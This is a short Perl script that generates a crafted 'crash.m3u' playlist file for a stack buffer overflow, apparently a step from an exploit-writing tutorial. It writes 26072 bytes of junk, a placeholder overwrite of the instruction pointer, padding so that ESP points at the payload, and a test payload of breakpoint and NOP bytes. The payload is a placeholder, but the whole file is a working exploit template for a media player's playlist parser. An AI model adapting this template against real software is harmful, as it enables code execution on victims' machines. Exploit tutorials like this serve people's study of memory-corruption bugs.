#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 26072;

my $eip = "\x42" x 4;

my $prependesp = "XXXX";  #add 4 bytes so ESP points at beginning of shellcode bytes

my $shellcode = "\xcc"; #first break

$shellcode = $shellcode . "\x90" x 7;  #add 7 more bytes

$shellcode = $shellcode . "\xcc"; #second break

$shellcode = $shellcode . "\x90" x 500;  #real shellcode

open($FILE,">$file");

print $FILE $junk.$eip.$prependesp.$shellcode;

close($FILE);

print "m3u File Created successfully\n";
